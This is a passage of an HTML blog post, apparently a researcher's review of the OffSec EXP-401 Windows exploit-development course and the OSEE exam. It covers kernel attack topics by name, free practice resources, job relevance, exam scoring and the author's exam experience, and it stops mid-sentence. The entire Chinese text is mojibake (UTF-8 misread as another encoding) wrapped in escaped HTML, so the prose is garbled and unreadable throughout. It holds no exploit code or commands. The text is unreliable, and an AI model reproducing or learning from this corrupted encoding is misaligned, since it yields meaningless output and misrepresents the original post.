&lt;p&gt;å‰å¹¾å¤©çš„èª²ç¨‹ä¸»è¦èšç„¦åœ¨ Windows User Mode çš„ä¿è­·æ©Ÿåˆ¶èˆ‡æ¼æ´åˆ©ç”¨ï¼Œåˆ°äº†æœ€å¾Œå…©å¤©ï¼Œå‰‡å°ˆæ³¨åœ¨ Kernel Mode çš„å…§å®¹ã€‚æˆ‘å€‘å­¸ç¿’äº†æœ‰é—œ Kernel Driver ä»¥åŠ Win32k çš„æ¼æ´åˆ©ç”¨ï¼Œæ¶µè“‹äº†å¤§é‡ä½œæ¥­ç³»çµ±ç›¸é—œçŸ¥è­˜ä»¥åŠ Kernel ç¨æœ‰çš„æ”»æ“ŠæŠ€å·§ï¼Œå¦‚ï¼šToken Stealingã€ACL NULL-ingã€SMEPã€Page Tableã€KVA Shadowã€Desktop Heapã€Virtualization-Based Securityã€kCFG ç­‰ç­‰ã€‚åœ¨ Kernel å±¤ç´šï¼Œæˆ‘å€‘æ›´éœ€è¦ç‰¹åˆ¥æ³¨æ„æ¼æ´åˆ©ç”¨çš„ç©©å®šæ€§ï¼Œä»¥åŠå¦‚ä½•åœ¨å®Œæˆåˆ©ç”¨å¾Œå°‡ç³»çµ±æ¢å¾©åˆ°æ­£å¸¸ç‹€æ…‹ï¼Œè€Œä¸æ˜¯ç›´æ¥è®“ç³»çµ± Crashã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶é€™å ‚èª²é•·é”äº”å¤©ï¼Œä½†éš¨è‘—æ™‚é–“æ¨é€²ï¼Œæ„Ÿè¦ºå¤§å®¶è¶Šä¾†è¶Šèˆˆå¥®ã€‚Lays èªªï¼Œå¯èƒ½æ˜¯å› ç‚ºå¹³å¸¸æ ¹æœ¬æ²’äººåœ¨ä¹ Windowsï¼Œç¾åœ¨æœ‰ä¸€é–€èª²äº”å¤©éƒ½åœ¨è¬›é€™å€‹æ±è¥¿å°±å¾ˆçˆ½ã€‚åˆ°äº†å¾Œé¢ï¼Œä¸Šèª²æ™‚å¹¾ä¹æ‰€æœ‰äººéƒ½èˆˆå¥®åœ°ç«™è‘—çœ‹è¬›å¸«æ“ä½œ WinDBG åŠä¿®æ­£ exploitï¼Œæ°£æ°›ä¸€ç›´ç†±çƒˆåˆ°èª²ç¨‹çµæŸã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œæœ€å¾Œæˆ‘é †åˆ©æ‹¿åˆ°äº†å…©æš Challenge Coinã€‚ä¸éè½åŒäº‹èªªï¼Œæœ‰åœ‹å¤–çš„å­¸å“¡åœ¨å¿ƒå¾—æ–‡ä¸­æåˆ°ï¼Œå› ç‚ºèª²å ‚ä¸Šæ‹¿åˆ°äº†å…©æš Challenge Coinï¼Œå¤ªéè‡ªä¿¡ï¼Œçµæœè€ƒè©¦æ™‚æ²’æœ‰å……åˆ†æº–å‚™ï¼Œè½å¾—æˆ‘éƒ½æœ‰é»ç·Šå¼µäº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_29009efc9ab35f26cdb952f962900dfb.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;æ„Ÿæƒ³&quot;&gt;æ„Ÿæƒ³&lt;/h2&gt;

&lt;h3 id=&quot;å®Œæ•´çš„é«”é©—&quot;&gt;å®Œæ•´çš„é«”é©—&lt;/h3&gt;

&lt;p&gt;ä¸€é€±çš„å¯¦é«”è¨“ç·´èª²ç¨‹å¸¶ä¾†äº†æ¥µä½³çš„å¿ƒæµé«”é©—ã€‚é€™äº”å¤©çš„ç”Ÿæ´»ï¼Œé™¤äº† Windows çš„ exploit ä¹‹å¤–å°±æ²’åˆ¥çš„æ±è¥¿äº†ï¼ŒåŠ ä¸Š Extra Miles çš„çå‹µæ©Ÿåˆ¶ï¼Œå¯ä»¥èªªæ˜¯é€£åšå¤¢éƒ½åœ¨å¯« exploitï¼Œç²¾ç¥ç‹€æ…‹ç›´æ¥è®Šæˆ Windows çš„å½¢ç‹€ã€‚è€Œä¸”ç‚ºäº†ç¢ºä¿ç³»çµ±çš„ç©©å®šæ€§é‚„æœ‰é–‹ç™¼çš„é€Ÿåº¦ï¼Œå¾ä¸€é–‹å§‹å°±å¿…é ˆèªçœŸæ€è€ƒï¼Œé¸æ“‡æœ€é©åˆçš„æ–¹å¼ä¾†å®Œæˆ exploitï¼Œä»¥ä¾¿å¾ŒçºŒä½œæ¥­èƒ½æ›´è¼•é¬†ã€‚åŒæ™‚ï¼Œä¹Ÿå¿…é ˆå»ºç«‹è‰¯å¥½çš„ coding ç¿’æ…£ï¼Œé€™ä¸åƒ…èƒ½åœ¨é™¤éŒ¯éç¨‹ä¸­æå‡å¯è®€æ€§ï¼Œä¹Ÿèƒ½åœ¨å¾ŒçºŒç¶­è­·æ™‚ï¼Œæ¸›å°‘å‡ºéŒ¯çš„æ©Ÿç‡ï¼Œä¸¦ç¯€çœé‡æ¸…æ¦‚å¿µæ‰€éœ€çš„æ™‚é–“ã€‚&lt;/p&gt;
&lt;h3 id=&quot;å­¸ç¿’è³‡æº&quot;&gt;å­¸ç¿’è³‡æº&lt;/h3&gt;

&lt;p&gt;å¾ŒçºŒæœ‰ä¸å°‘äººç§è¨Šè©¢å• EXP-401 é€™å ‚èª²æ˜¯å¦æœ‰å»ºè­°çš„ learning pathï¼Œä¾‹å¦‚æ˜¯å¦æ‡‰è©²å…ˆä¿®å“ªäº›èª²ç¨‹ï¼Œæˆ–æ˜¯å¦æœ‰æ¨è–¦çš„é ç¿’è³‡æºã€‚è€å¯¦èªªï¼Œæˆ‘è¦ºå¾—èª²ç¨‹æœ¬èº«å°±è¶³å¤ äº†ï¼Œä¸å¤ªéœ€è¦é¡å¤–æ‰¾å…¶ä»–è³‡æºä¾†æº–å‚™ã€‚ä¸éï¼Œå¦‚æœä½ é‚„åœ¨è€ƒæ…®è‡ªå·±æ˜¯å¦é©åˆé€™å ‚èª²ï¼Œå¯ä»¥å…ˆå¾ä»¥ä¸‹å¹¾å€‹å…è²»è³‡æºé–‹å§‹ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HackSys Extreme Vulnerable Driver (HEVD)&lt;/a&gt;ï¼šé€™å€‹å°ˆæ¡ˆæä¾›äº†è¨±å¤šè¨­è¨ˆä¾†ç·´ç¿’çš„æœ‰æ¼æ´çš„ Windows Driverã€‚ä¸éå› ç‚ºæ˜¯ Driverï¼Œä¸»è¦ç·´ç¿’çš„æ˜¯ Kernel Mode çš„ä¿è­·æ©Ÿåˆ¶ã€æ¼æ´ç™¼ç¾èˆ‡åˆ©ç”¨æ–¹æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://p.ost2.fyi/&quot;&gt;OpenSecurityTraining2&lt;/a&gt;ï¼šé€™å€‹ç¶²ç«™ä¸Šæœ‰è¨±å¤šè³‡å®‰ç ”ç©¶å“¡ç„¡å„Ÿè£½ä½œçš„å…è²»èª²ç¨‹ï¼Œä¸åƒ…åŒ…å« Windows ç›¸é—œèª²ç¨‹ï¼Œä¹Ÿæœ‰è¨±å¤šåŸºç¤èª²ç¨‹ï¼Œä¾‹å¦‚ï¼šx86-64 OS Internalsã€Introductory WinDbg ç­‰ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é€™äº›è³‡æºéƒ½æ˜¯éå¸¸çŸ¥åä¸”å“è³ªæœ‰ä¿éšœçš„å…è²»æ•™æï¼Œç¶­è­·è€…æœ¬èº«è¦ä¸æ˜¯ç¾è·è³‡å®‰ç ”ç©¶å“¡ï¼Œå°±æ˜¯åŒæ™‚ä¹Ÿæœ‰åœ¨é–‹è¨­ä»˜è²»èª²ç¨‹çš„å°ˆæ¥­äººå£«ã€‚å°±æˆ‘æ‰€çŸ¥ï¼Œè¨±å¤šåˆå­¸è€…åœ¨æ—©æœŸå­¸ç¿’æ™‚æœŸå°±æ˜¯é é€™äº›è³‡æºæ‰“åŸºç¤ã€‚ï¼ˆä¸éæˆ‘å€‹äººæ²’æœ‰å®Œæ•´ä½¿ç”¨éé€™äº›è³‡æºï¼Œç¸½æ™‚æ•¸ä¸è¶…éå…©å€‹å°æ™‚ã€‚ï¼‰&lt;/p&gt;

&lt;p&gt;æˆ–è€…ï¼Œå‡è¨­ä½ çš„ç¨‹åº¦æ¯”è¼ƒé€²éšä¸€é»ï¼Œé‚£å…¶å¯¦å¯ä»¥è€ƒæ…®ç›´æ¥æ‰¾ç¶²è·¯ä¸Šæœ‰ Write-up çš„ 1-day å¾©ç¾ã€‚åƒé€™å ‚èª²ä¸­æåˆ°çš„æŸå€‹ Win32k æ¼æ´ï¼Œæˆ‘å…¶å¯¦ä¸€å…©å¹´å‰å°±å¯«éå®Œæ•´çš„ exploitï¼Œé›–ç„¶ç•¶æ™‚åšå¾—é‚„ä¸å¤ ç©©å®šã€‚Angelboy ä¹Ÿå¯«éä¸€äº›èª²ç¨‹ä¸­æåˆ°ã€é›£åº¦æ¯”è¼ƒé«˜çš„æ¼æ´åˆ©ç”¨ã€‚é€™ç¨®å¯¦ä½œç·´ç¿’éå¸¸æœ‰å¹«åŠ©ï¼Œå› ç‚ºéç¨‹ä¸­æœƒç¶“æ­·åˆ° exploit é–‹ç™¼çš„å„å€‹æ­¥é©Ÿï¼šæœé›†è³‡æ–™ã€å®šä½æ¼æ´ä½ç½®ã€ä¿è­·æ©Ÿåˆ¶çš„ç¹éã€Windows çš„ç‰¹æ®Šæ©Ÿåˆ¶ç­‰ç­‰ã€‚&lt;/p&gt;

&lt;h3 id=&quot;èª²ç¨‹æœ¬èº«çš„åƒ¹å€¼&quot;&gt;èª²ç¨‹æœ¬èº«çš„åƒ¹å€¼&lt;/h3&gt;

&lt;p&gt;é€™é–€èª²å¯ä»¥èªªæ˜¯ OffSec ç²¾å¿ƒæç…‰å¾Œçš„ä¸€å¸–å¤§è£œè—¥ï¼Œä¸åƒ…å°‡ Windows å„ç¨®ä¿è­·æ©Ÿåˆ¶ç³»çµ±æ€§åœ°æ•´ç†èµ·ä¾†ï¼Œé‚„æ¶µè“‹äº†è¨±å¤šåœ¨å…¬é–‹è³‡æºä¸­é›£ä»¥æ‰¾åˆ°çš„ç´°ç¯€ã€‚åšç ”ç©¶çš„äººæ‡‰è©²éƒ½èƒ½é«”æœƒï¼šæˆ‘å€‘æˆ–è¨±çŸ¥é“æŸå€‹ä¿è­·æ©Ÿåˆ¶æˆ–ç³»çµ±è¨­è¨ˆçš„å­˜åœ¨ï¼Œä½†è¦æ·±å…¥äº†è§£å®ƒå€‘èƒŒå¾Œçš„å…·é«”å¯¦ä½œï¼Œå¾€å¾€éœ€è¦è‡ªå·±å¾é›¶é–‹å§‹ï¼Œæ”¶é›†é›¶ç¢çš„è³‡æ–™ã€åˆ†æç¨‹å¼ç¢¼ã€èŠ±è²»å¤§é‡æ™‚é–“åè¦†æ¨æ•²ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ç†è§£ä¸€å€‹å¤§å‹ç³»çµ±æ™‚ï¼Œé€šå¸¸ä¹Ÿæœƒé‡åˆ°é¡ä¼¼çš„æƒ…æ³ï¼šç³»çµ±ä¸­å­˜åœ¨è¨±å¤šé‡è¦çš„è§’è‰²èˆ‡æ©Ÿåˆ¶ï¼Œä½†ç›¸é—œç ”ç©¶å¾€å¾€æ•£è½åœ¨éå»åå¹¾å¹´çš„è³‡æ–™ä¸­ã€‚ç¬¬ä¸€æ­¥ï¼Œè¦å…ˆèŠ±æ™‚é–“æœå°‹ä¸¦æ•´ç†éå»åå¹´çš„ç ”ç©¶ï¼Œé€æ­¥é‡æ¸…å„å€‹è§’è‰²ä¹‹é–“çš„äº’å‹•é—œä¿‚ï¼Œé€²è€Œç†è§£å®ƒå€‘åœ¨ä»€éº¼æ¢ä»¶ä¸‹æœƒå¤±æ•ˆï¼Œæœ€çµ‚æ‰èƒ½æ‹¼æ¹Šå‡ºä¸€å€‹å®Œæ•´çš„æ•…äº‹ã€‚è€Œé€™ç¨®å¾å¤§é‡è³‡æ–™ä¸­æ¢³ç†å‡ºä¾†çš„ç ”ç©¶æˆæœï¼Œé€šå¸¸æ˜¯ä¸æœƒè¼•æ˜“å°å¤–åˆ†äº«çš„ã€‚&lt;/p&gt;

&lt;p&gt;è€Œ EXP-401ï¼Œæ­£æ˜¯æŠŠé€™æ¨£ç­‰ç´šçš„ç ”ç©¶æˆæœæ¿ƒç¸®æˆèª²ç¨‹å…§å®¹ï¼Œæ¯«ç„¡ä¿ç•™åœ°åˆ†äº«çµ¦å­¸å“¡ã€‚å¾æœ€æ—©æœŸçš„ DEP ä¿è­·æ©Ÿåˆ¶é–‹å§‹ï¼Œå„ç¨®ä¿è­·æ©Ÿåˆ¶æ¥è‘—ä¸€å±¤å±¤çš„å †ç–Šä¸Šå»ï¼ŒEXP-401 åœ¨èª²ç¨‹ä¸­å°±ä¸€æ­¥æ­¥å¸¶ä½ èµ°éé€™æ•´å€‹æ­·å²è»Œè·¡ã€‚æ¯ä¸€å±¤é˜²è­·æ˜¯ç‚ºäº†è§£æ±ºä»€éº¼æ¨£çš„å•é¡Œï¼Ÿåˆæ˜¯å¦‚ä½•è¢«æ”»æ“Šè€…é€æ­¥ç¹éï¼Ÿèª²ç¨‹ä¸åªæ˜¯è¬›ç†è«–ï¼Œé‚„çµåˆå…·é«”æ¼æ´æ¡ˆä¾‹ï¼Œæ•™ä½ å¦‚ä½•å¯¦éš›é¿é–‹é€™äº›é˜²è­·æ©Ÿåˆ¶ã€‚&lt;/p&gt;

&lt;p&gt;åˆ°èª²ç¨‹çµæŸæ™‚ï¼Œå­¸å“¡è…¦ä¸­å·²ç¶“æ§‹ç¯‰å‡ºä¸€å¹…æ¸…æ™°çš„ Windows è—åœ–ã€‚æ¯å€‹ä¿è­·æ©Ÿåˆ¶çš„å‡ºç¾èƒŒæ™¯ã€é‹ä½œæ–¹å¼ã€å¯èƒ½çš„å¼±é»èˆ‡å°æ‡‰çš„åˆ©ç”¨æ–¹æ³•ï¼Œéƒ½èƒ½ä¸€ä¸€é€£çµèµ·ä¾†ã€‚é€™ä¸åªæ˜¯å–®ç´”çš„æå‡äº†æ’°å¯« exploit çš„èƒ½åŠ›ï¼Œè€Œæ˜¯çœŸæ­£æŒæ¡äº† Windows ç³»çµ±å…§éƒ¨é‹ä½œçš„è„ˆçµ¡èˆ‡æ•…äº‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;èª²ç¨‹å…§å®¹ä¾ç„¶é©ç”¨å—&quot;&gt;èª²ç¨‹å…§å®¹ä¾ç„¶é©ç”¨å—&lt;/h3&gt;

&lt;p&gt;EXP-401 çš„èª²ç¨‹è¨­è¨ˆä¸»è¦åœç¹åœ¨ Windows çš„ä¿è­·æ©Ÿåˆ¶èˆ‡æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸Šï¼Œå…§å®¹ä¸¦æœªéå¤šè‘—å¢¨æ–¼é‚£äº›å·²ç¶“è¢«æ·˜æ±°çš„æŠ€è¡“ã€‚å› æ­¤ï¼Œèª²ç¨‹ä¸­ä»‹ç´¹çš„å„ç¨®ä¿è­·æ©Ÿåˆ¶ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯ç›®å‰ Windows ç³»çµ±ä¸­ä»ç„¶å­˜åœ¨ä¸”æœ‰æ•ˆçš„é˜²è­·æªæ–½ã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº†è¬›è§£ä¿è­·æ©Ÿåˆ¶æœ¬èº«ï¼Œèª²ç¨‹ä¹Ÿæ­é…äº†è¨±å¤šè¼”åŠ©æ•™æã€‚ä¸éï¼Œé€™äº›æ•™æçš„ä¸»è¦ç›®çš„æ˜¯ç‚ºäº†èªªæ˜å„ç¨®æƒ…å¢ƒï¼Œä¸¦ä¿ƒé€²å­¸å“¡å°æ¼æ´åˆ©ç”¨æ–¹æ³•çš„æ€è€ƒã€‚ä¾‹å¦‚ï¼Œä»¥èª²ç¨‹ä¸­ä½¿ç”¨ Chakra å¼•æ“ç‰ˆæœ¬çš„ Edge ç€è¦½å™¨ä¾†èªªï¼Œä½¿ç”¨ Chakra ç‰ˆæœ¬çš„ Edge ç•¶ç„¶ä¸è²¼è¿‘ç¾å¯¦ï¼Œå› ç‚ºæ²’æœ‰äººåœ¨ä½¿ç”¨å®ƒäº†ï¼Œä½†å¾ Windows ç³»çµ±ä¿è­·æ©Ÿåˆ¶çš„è§’åº¦ä¾†çœ‹ï¼Œé€™æ¨£çš„ç¯„ä¾‹ä¾ç„¶ç›¸ç•¶é©ç”¨ã€‚å› ç‚ºç„¡è«–æ˜¯å“ªä¸€æ¬¾ç€è¦½å™¨ï¼Œåªè¦å‡ºç¾æ¼æ´ï¼Œé–‹ç™¼ exploit æ™‚æ‰€é¢å°çš„ç³»çµ±å±¤é¢å•é¡ŒåŸºæœ¬ä¸Šæ˜¯ä¸€è‡´çš„ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œåœ¨ã€Œç€è¦½å™¨ç¯„åœå…§ã€è¦è§£æ±ºçš„å•é¡Œæ˜¯ä¸ä¸€æ¨£çš„ï¼Œåƒ Chrome å°±æœƒå¤šå‡ºä¸€å±¤è‡ªå·±è¨­è¨ˆçš„ Sandbox æ©Ÿåˆ¶ï¼Œé€™æ˜¯æ‡‰ç”¨ç¨‹å¼å±¤é¢çš„é¡å¤–æŒ‘æˆ°ã€‚ä½†å¿…é ˆç†è§£ï¼Œé™¤éé€™é–€èª²å«åš Browser Exploit Developmentï¼Œå¦å‰‡ä½ ä¸æ‡‰è©²é æœŸåœ¨é€™å ‚èª²ä¸Šç²å–å¤ªå¤šç€è¦½å™¨ç‰¹æœ‰é˜²è­·æ©Ÿåˆ¶ç›¸é—œçš„çŸ¥è­˜ã€‚&lt;/p&gt;

&lt;p&gt;ç¸½çµä¾†èªªï¼Œå¦‚æœåªèšç„¦åœ¨ Windows ç³»çµ±æœ¬èº«çš„ä¿è­·æ©Ÿåˆ¶èˆ‡æ¼æ´åˆ©ç”¨æŠ€å·§ä¸Šï¼ŒEXP-401 çš„èª²ç¨‹å…§å®¹åœ¨ä»Šå¤©ä¾ç„¶éå¸¸é©ç”¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å°æ‰¾å·¥ä½œæœ‰å¹«åŠ©å—&quot;&gt;å°æ‰¾å·¥ä½œæœ‰å¹«åŠ©å—&lt;/h3&gt;

&lt;p&gt;é€™æ˜¯è¨±å¤šäººé—œå¿ƒçš„å•é¡Œã€‚æˆ‘çš„å›ç­”æ˜¯ï¼š&lt;strong&gt;æœ‰å¹«åŠ©ï¼Œä½†å½±éŸ¿ä¸å¤§ã€‚&lt;/strong&gt; ç‚ºä»€éº¼é€™éº¼èªªå‘¢ï¼Ÿ&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;å¦‚æœä½ æƒ³æˆç‚ºä¸€åç´…éšŠæ¼”ç·´å°ˆå®¶ï¼š&lt;/strong&gt; åœ¨æ²’æœ‰ç´…éšŠç›¸é—œè­‰ç…§çš„æƒ…æ³ä¸‹ï¼Œåƒ…æŒæœ‰ OSEE ä¸¦ä¸èƒ½è­‰æ˜ä»€éº¼ã€‚é›‡ä¸»æ›´åœ¨æ„çš„æ˜¯ä½ æ˜¯å¦å…·å‚™å®Œæ•´çš„ç´…éšŠæ¼”ç·´æ€ç¶­ï¼ˆmindsetï¼‰ï¼Œè€Œä¸æ˜¯ä½ æœ‰èƒ½åŠ›åœ¨ Windows ä¸Šé¢é–‹ç™¼ exploitã€‚ç•¶ç„¶ï¼Œå¦‚æœå…©è€…å…¼å‚™ï¼Œè‚¯å®šæ˜¯éå¸¸åŠ åˆ†çš„ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å¦‚æœä½ æƒ³æˆç‚ºä¸€åè³‡å®‰ç ”ç©¶å“¡ï¼š&lt;/strong&gt; é€™é–€èª²çš„å…§å®¹åƒ…èƒ½è¦–ç‚ºå…¥é–€ç­‰ç´šã€‚å–å¾— OSEE è­‰ç…§ï¼Œé ‚å¤šè­‰æ˜ä½ æœ‰èƒ½åŠ›è™•ç†æŸäº›åŸºæœ¬çš„æŠ€è¡“å•é¡Œã€‚ä½†åœ¨çœŸæ­£çš„ç ”ç©¶å·¥ä½œä¸­ï¼Œæ›´é‡è¦çš„æ˜¯ï¼šä½ èƒ½ä¸èƒ½è‡ªå·±ä¸»å°ä¸€å€‹ç ”ç©¶ï¼Ÿèƒ½ä¸èƒ½ç¨ç«‹è§£æ±ºç ”ç©¶éç¨‹ä¸­é‡åˆ°çš„å„ç¨®å•é¡Œï¼Ÿ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å› ç‚ºæˆ‘æ˜¯è³‡å®‰ç ”ç©¶å“¡ï¼Œæ‰€ä»¥æƒ³æ›´æ·±å…¥èŠèŠç¬¬äºŒé»ã€‚å¦‚æœä½ æƒ³æˆç‚ºä¸€åçœŸæ­£çš„ç ”ç©¶å“¡ï¼Œé‚£äº‹å¯¦ä¸Šä½ ä¸¦ä¸éœ€è¦ä»»ä½•è­‰ç…§ï¼Œæ²’æœ‰ä»»ä½•è­‰ç…§å¯ä»¥ç›´æ¥è­‰æ˜ä¸€å€‹äººç ”ç©¶çš„å“è³ªã€‚çœŸæ­£çš„èƒ½åŠ›ï¼Œéœ€è¦é€éç´¯ç©å¯¦ç¸¾ã€ç™¼è¡¨æˆæœä¾†è­‰æ˜ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œåœ¨ç´¯ç©å¯¦ç¸¾ä¹‹å‰ï¼Œå¿…ç„¶æœƒæœ‰ä¸€æ®µæ™‚é–“ä¸çŸ­çš„ï¼Œç´®å¯¦å­¸ç¿’ã€åè¦†æ’ç‰†çš„éç¨‹ã€‚å¾é€™å€‹è§’åº¦ä¾†çœ‹ï¼Œ&lt;strong&gt;EXP-401 çš„åƒ¹å€¼ï¼Œåœ¨æ–¼å¹«åŠ©ä½ å¿«é€Ÿä¸”æœ‰ç³»çµ±åœ°å»ºç«‹èµ·å¿…è¦çš„åŸºç¤çŸ¥è­˜ã€‚&lt;/strong&gt; å°æ–¼é€™é–€èª²æœ€æ·ºç™½çš„ç†è§£æ˜¯ï¼šã€Œå¿«é€Ÿæº–å‚™å¥½ Windows ç ”ç©¶æ‰€éœ€çš„æŠ€è¡“èƒŒæ™¯ã€ã€‚ä½†å¯¦éš›ä¸Šï¼ŒEXP-401 çš„åƒ¹å€¼ä¸åƒ…æ­¢æ–¼æ­¤ã€‚EXP-401 çš„ä¸Šèª²éç¨‹æ›´åƒæ˜¯ã€Œè‡¨æ‘¹å¤§å¸«åä½œã€ï¼Œè·Ÿéš¨éå»é ‚å°–ç ”ç©¶å“¡çš„è…³æ­¥ï¼Œå¾æ–°ä¿è­·æ©Ÿåˆ¶çš„æ¨å‡ºã€ç†è§£åˆ°ç¹éï¼Œå­¸ç¿’é€™å€‹éç¨‹ä¸­éœ€è¦æŒæ¡çš„å·¥å…·ã€æŠ€å·§ï¼Œä»¥åŠå¦‚ä½•æœ‰æ•ˆæç…‰å‡ºé—œéµè³‡è¨Šã€‚é›–ç„¶èª²ç¨‹ä¸»é¡Œåœç¹åœ¨ Windows ä¸Šï¼Œä½†èƒŒå¾Œè¨“ç·´çš„æ€è€ƒæ¨¡å‹èˆ‡ç ”ç©¶æ–¹æ³•å»ä¸åƒ…æ­¢æ–¼ Windowsï¼Œé€™äº›èƒ½åŠ›æ˜¯å¯ä»¥è¢«æ‡‰ç”¨åˆ° IoTã€Linuxã€macOS ç­‰å…¶ä»–é ˜åŸŸçš„ã€‚&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‹äººèªç‚ºé€™å ‚èª²çš„åƒ¹å€¼æ¯”èµ·è­‰ç…§æœ¬èº«æ›´é«˜ï¼Œä½†ç•¶ç„¶ï¼Œä»˜ä¸€æ¨£çš„éŒ¢é‚„æ˜¯æŠŠè­‰ç…§ä¸€èµ·æ‹¿èµ°æ¯”è¼ƒè³ºã€‚&lt;/p&gt;

&lt;h2 id=&quot;è€ƒè©¦èˆ‡å ±å‘Šæ’°å¯«&quot;&gt;è€ƒè©¦èˆ‡å ±å‘Šæ’°å¯«&lt;/h2&gt;

&lt;p&gt;å¦‚åŒå‰é¢èªªçš„ï¼ŒOSEE è€ƒè©¦ä¸€å…±æœ‰å…©é¡Œã€‚OffSec ç‚ºæ­¤è¨­è¨ˆäº†ä¸€ç³»åˆ—æ¼æ´ï¼Œä¸¦ä¸”ç‚ºäº†è²¼è¿‘ç¾å¯¦ï¼Œæ¯å€‹æ¼æ´éƒ½æœ‰å°æ‡‰çš„ CVE Advisory å’Œæ¨¡æ“¬çš„éƒ¨è½æ ¼æ–‡ç« ã€‚éƒ¨è½æ ¼æ–‡ç« ä¸»è¦ä»‹ç´¹ç¨‹å¼çš„é‹ä½œæ©Ÿåˆ¶å’Œéå»æ¼æ´åˆ©ç”¨çš„æ–¹æ³•ï¼Œè€Œ CVE Advisory é›–ç„¶æœƒæè¿°æ¼æ´é¡å‹ï¼Œä½†ä¸¦ä¸æœƒå…·é«”æŒ‡å‡ºæ¼æ´ä½ç½®ã€è§¸ç™¼æ–¹å¼ï¼Œä¹Ÿä¸æœƒæä¾› PoCã€‚è€ƒç”Ÿå¿…é ˆä¾é é€™äº›ç·šç´¢ï¼Œè‡ªè¡Œé€†å‘åˆ†æï¼Œæ‰¾å‡ºæ¼æ´æ‰€åœ¨ï¼Œæ’°å¯«å¯è§¸ç™¼æ¼æ´çš„ç¨‹å¼ï¼Œæœ€çµ‚åœ¨ç¹éæ‰€æœ‰ä¿è­·æ©Ÿåˆ¶å¾Œï¼Œè®€å– &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt; æª”æ¡ˆï¼Œæ‰ç®—å®ŒæˆæŒ‘æˆ°ã€‚&lt;/p&gt;

&lt;p&gt;è€ƒè©¦æ™‚é–“å®‰æ’ç‚ºï¼š&lt;strong&gt;72 å°æ™‚å…§å®Œæˆ exploitï¼Œ24 å°æ™‚å…§å®Œæˆå ±å‘Š&lt;/strong&gt;ã€‚ä½†å¯¦éš›æ“ä½œæ™‚ï¼Œæ™‚é–“é æ²’æœ‰è¡¨é¢ä¸Šé‚£éº¼å……è£•ï¼Œé€™é»ç¨å¾Œæœƒè§£é‡‹ã€‚&lt;/p&gt;

&lt;p&gt;å…·é«”è©•åˆ†æ¨™æº–å¯åƒè€ƒ OSEE å®˜æ–¹æä¾›çš„å ±å‘Šæ¨¡æ¿ï¼š&lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt;ã€‚æ¯ä¸€é¡Œçš„åˆ†æ•¸éƒ½æ˜¯ 50 åˆ†ï¼Œä½†è‹¥åªå®ŒæˆæŸé¡Œçš„ä¸€åŠï¼Œåƒ…èƒ½ç²å¾— 25 åˆ†ï¼Œè€Œåˆæ ¼åˆ†æ•¸ç‚º 75 åˆ†ã€‚ä¾‹å¦‚ï¼Œä»¥å ±å‘Šæ¨¡æ¿ä¸­çš„ç¬¬ä¸€é¡Œä¾†èªªï¼Œè‹¥åªåšåˆ° Code Executionï¼Œå»ç„¡æ³•å®Œæˆ Sandbox Escapeï¼Œå°±åªèƒ½æ‹¿ 25 åˆ†ï¼›ç¬¬äºŒé¡Œè‹¥åƒ…åšåˆ° Read/Write Primitiveï¼Œä½†æœªæˆåŠŸæå‡æ¬Šé™ï¼ŒåŒæ¨£åªèƒ½æ‹¿ 25 åˆ†ã€‚&lt;/p&gt;

&lt;p&gt;é›–ç„¶æˆ‘åœ¨å»å¹´å…«æœˆå°±ä¸Šå®Œèª²ï¼Œä½†æ˜¯å› ç‚ºè¶…ç´šå¿™çš„æ‰€ä»¥æ ¹æœ¬å°±æ²’è¾¦æ³•å®‰æ’è€ƒè©¦ã€‚ä¹æœˆã€åæœˆä¸»è¦å¿™è‘—ç ”ç©¶ Pwn2Own çš„ç›®æ¨™ï¼ˆæœ€å¾ŒæˆåŠŸæ‰“ä¸‹ AeoTecï¼‰ï¼Œå¹´åº•å‰‡æ˜¯æº–å‚™ CCC çš„æ¼”è¬›ï¼Œå¹´åˆæ¥è‘—æ˜¯ SITCON å’Œä¸‰æœˆçš„ DEVCORE Confã€‚ä½†æœ€å¾Œé‚„æ˜¯å‹‰å¼·åœ¨ 2/24 å¡äº†ä¸€å€‹ OSEE è€ƒè©¦ã€‚&lt;/p&gt;

&lt;p&gt;ç•¶å¤©æ—©ä¸Šå…«é»é–‹è€ƒï¼Œç¬¬ä¸€é¡Œå¾ˆå¿«å°±å¼„å‡º  Code Execution æ‹¿åˆ° 25 åˆ†ã€‚ä¸éå› ç‚ºä¸€å€‹å°åœ°æ–¹æ²’æ³¨æ„ï¼Œå¡åœ¨ Sandbox Escape åšä¸å‡ºä¾†ã€‚æ‰€ä»¥ç¬¬äºŒå¤©å…ˆè·³å»ç¬¬äºŒé¡Œçœ‹çœ‹ï¼Œä¸‹åˆå…©é»å·¦å³å°±æŠŠé¡Œç›®è§£æ‰ï¼Œæ‹¿äº† 50 åˆ†ï¼›å‰©ä¸‹åŠå¤©ç¹¼çºŒç£¨ç¬¬ä¸€é¡Œï¼Œçµ‚æ–¼åœ¨åŠå¤œå…©é»ç ´å°ã€‚åŸæœ¬å¤§å®¶é‚„åœ¨è¬›èªªè¦æ¶å°ç£ç¬¬ä¸€å¼µ 